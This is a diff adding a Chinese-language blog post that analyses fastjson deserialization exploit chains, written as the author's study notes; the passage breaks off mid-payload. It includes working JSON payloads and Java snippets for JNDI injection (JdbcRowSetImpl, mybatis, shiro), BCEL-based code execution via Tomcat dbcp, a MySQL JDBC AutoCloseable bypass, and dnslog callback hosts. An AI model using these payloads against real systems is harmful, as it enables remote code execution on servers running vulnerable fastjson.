@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>fastjson-4 - LostZX</title>
+
+  
+  <meta name="description" content="关于fastjson的第四篇胡言乱语
+fastjson payload分析">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/38459891.jpg" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">LostZX</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">博客</a><a class="nav-item" href="/notes/">杂记</a><a class="nav-item" href="/more/">更多</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-JNDI%E7%B1%BB"><span class="toc-text">Fastjson JNDI类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl-payload"><span class="toc-text">JdbcRowSetImpl payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mybatis-JndiDataSourceFactory-payload"><span class="toc-text">mybatis JndiDataSourceFactory payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-jndi-payload"><span class="toc-text">shiro jndi payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%B1%BB"><span class="toc-text">Fastjson 代码执行类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-dbcp-BasicDataSource-payload"><span class="toc-text">Tomcat dbcp BasicDataSource payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#templatesimpl-payload"><span class="toc-text">templatesimpl payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-JDBC%E7%B1%BB"><span class="toc-text">mysql JDBC类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog-payload"><span class="toc-text">DNSlog payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-text">结束</span></a></li></ol></div></div></div>
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">LostZX</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta">发布于&nbsp;<time datetime="2021-10-23T08:44:35.145Z">2021-10-23</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>fastjson-4</span></h1>
+<p>关于fastjson的第四篇胡言乱语</p>
+<p>fastjson payload分析</p>
+<span id="more"></span>
+
+<h1 id="Fastjson学他妈的"><a href="#Fastjson学他妈的" class="headerlink" title="Fastjson学他妈的"></a>Fastjson学他妈的</h1><p>像我这样的傻逼，就得多学几遍</p>
+<p>前面也写了几篇关于fastjson的笔记，写的顺序很乱，看了啥就写啥，水平也不行，保证会有很多问题。</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>主要学习fastjson反序列化中常用的一些利用链，这里不讨论RMI、JDK版本问题，后面会单独学习这一块。</p>
+<h2 id="Fastjson-JNDI类"><a href="#Fastjson-JNDI类" class="headerlink" title="Fastjson JNDI类"></a>Fastjson JNDI类</h2><p>挑几个jndi的看了下，其实都差不多，没啥好分析的</p>
+<h3 id="JdbcRowSetImpl-payload"><a href="#JdbcRowSetImpl-payload" class="headerlink" title="JdbcRowSetImpl payload"></a>JdbcRowSetImpl payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>);</span><br><span class="line">jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>简单看看，….没啥好分析的，setDataSourceName和setAutoCommit都是public的，可以直接设置，一气呵成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211023170647.png"></p>
+<p>payload </p>
+<p>这里用两层json在p牛的知识星球提过，兼容springboot的@RequestBody</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存绕过</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;fw2&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mybatis-JndiDataSourceFactory-payload"><a href="#mybatis-JndiDataSourceFactory-payload" class="headerlink" title="mybatis JndiDataSourceFactory payload"></a>mybatis JndiDataSourceFactory payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JndiDataSourceFactory jndiDataSourceFactory = <span class="keyword">new</span> JndiDataSourceFactory();</span><br><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.setProperty(<span class="string">&quot;data_source&quot;</span>,<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>);</span><br><span class="line">jndiDataSourceFactory.setProperties(properties);</span><br></pre></td></tr></table></figure>
+
+<p>同样到lookup</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211023172728.png"></p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;properties&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存绕过</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;fw2&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;properties&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="shiro-jndi-payload"><a href="#shiro-jndi-payload" class="headerlink" title="shiro jndi payload"></a>shiro jndi payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JndiObjectFactory jndiObjectFactory = <span class="keyword">new</span> JndiObjectFactory();</span><br><span class="line">jndiObjectFactory.setResourceName(<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>);</span><br><span class="line">jndiObjectFactory.getInstance();</span><br></pre></td></tr></table></figure>
+
+<p>这里的链需要在getter方法中调用，前面文章我们介绍了，只有parserObject不指定期望类的时候才会自动调用getter方法，但其实还有parser也可以调用的情况</p>
+<ol>
+<li>toJSONString</li>
+<li>$ref</li>
+</ol>
+<p>这里要版本 &gt;= 1.2.36 支持<code>$ref</code> <a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/JSONPath">语法参考</a></p>
+<p>开始直接改成Class缓存绕过的没有执行，跟了下源码在最后解析jsonpath的时候传入的index是个数，所以这里key改成1就可以了，只是简单跟一下，不知道通不通用</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211023200324.png"></p>
+<p>也是直接设置jndi地址，然后通过<code>$ref</code>调用getter方法，调用<code>getInstance</code>触发</p>
+<p>payload </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 开启autoType</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;instance&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存绕过</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">        <span class="comment">//这里的根元素是 整个json，是个map，要取到第二个obj</span></span><br><span class="line">        <span class="attr">&quot;instance&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$[1].instance&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// toJSONString</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;fw&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;fwname&quot;</span>: &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>&#125;,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;driver&quot;</span>: <span class="string">&quot;$$BCEL$$&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;instance&quot;</span>:<span class="string">&quot;instance&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;:<span class="string">&quot;fw&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Fastjson-代码执行类"><a href="#Fastjson-代码执行类" class="headerlink" title="Fastjson 代码执行类"></a>Fastjson 代码执行类</h2><p>这块还是要好好看看，以前就不太懂</p>
+<h3 id="Tomcat-dbcp-BasicDataSource-payload"><a href="#Tomcat-dbcp-BasicDataSource-payload" class="headerlink" title="Tomcat dbcp BasicDataSource payload"></a>Tomcat dbcp BasicDataSource payload</h3><p>这里触发在<code>getConnection</code>，然后出发到<code>Class.forName</code>去触发，流程也比较简单</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211023234455.png"></p>
+<p>payload主要触发getter方法，上面介绍过两种方法，这里都可以用到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class文件转bcel</span></span><br><span class="line">Path path = Paths.get(classFilePath);</span><br><span class="line"><span class="keyword">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">String code = Utility.encode(bytes, <span class="keyword">true</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也有org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// toJSONString</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;fwname&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span>:&#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span>:<span class="string">&quot;$$BCEL$$..&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;:<span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存绕过</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;fw2&quot;</span>:&#123;</span><br><span class="line">       <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span> </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;2&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,		</span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$..&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connection&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$[2].connection&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="templatesimpl-payload"><a href="#templatesimpl-payload" class="headerlink" title="templatesimpl payload"></a>templatesimpl payload</h3><p>就是cc链中的那个任意代码执行，但是这里的field是<code>private</code>的，不能自动设置，所以要设置<code>Feature.SupportNonPublicField</code>，鸡肋得很，就不分析了</p>
+<h2 id="mysql-JDBC类"><a href="#mysql-JDBC类" class="headerlink" title="mysql JDBC类"></a>mysql JDBC类</h2><p>关于JDBC反序列化原理的，可以看几篇文章，这里不展开讨论</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9250">https://xz.aliyun.com/t/9250</a></p>
+<p>之前分析1.2.68说到，绕过必须继承autocloseable，显然JDBC4Connection是符合的。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211024175446.png"></p>
+<p>触发就在构造方法中，所以直接调用到实例化就可以触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String hostToConnectTo = <span class="string">&quot;110.40.184.185&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> portToConnectTo = <span class="number">3306</span>;</span><br><span class="line">Properties info = <span class="keyword">new</span> Properties();</span><br><span class="line">info.put(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;yso_URLDNS_http://sdfsm0.dnslog.cn&quot;</span>);</span><br><span class="line">info.put(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">info.put(<span class="string">&quot;statementInterceptors&quot;</span>,<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">info.put(<span class="string">&quot;autoDeserialize&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">info.put(<span class="string">&quot;NUM_HOSTS&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">String databaseToConnectTo = <span class="string">&quot;dbname&quot;</span>;</span><br><span class="line">String url = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">JDBC4Connection jdbc4Connection = <span class="keyword">new</span> JDBC4Connection(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br></pre></td></tr></table></figure>
+
+<p>他的调用也很简单，在实例化的时候就会自动去连接，但是看到这个类并没有无参构造方法，前面分析1.2.24的时候说了fastjson会去取无参构造方法，而且在测试的时候1.2.24确实不能打，跟了一下逻辑，在获取不到无参构造方法只后，就回去找工厂方法，找不到就会抛出<code>default constructor not found</code>异常，但是看了下1.2.68的逻辑，到最后还是会取到构造方法，所以能调用到</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211024181338.png"></p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5.1.11-5.1.48</span></span><br><span class="line"><span class="comment">// 其他几条链就没测试了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AutoCloseable绕过</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;portToConnectTo&quot;</span>:<span class="number">3306</span>,  </span><br><span class="line">    <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;user&quot;</span>:<span class="string">&quot;yso_URLDNS_http://nvr7j2.dnslog.cn&quot;</span>,    </span><br><span class="line">        <span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,    </span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>,    </span><br><span class="line">        <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;,  </span><br><span class="line">    <span class="attr">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;dbname&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span 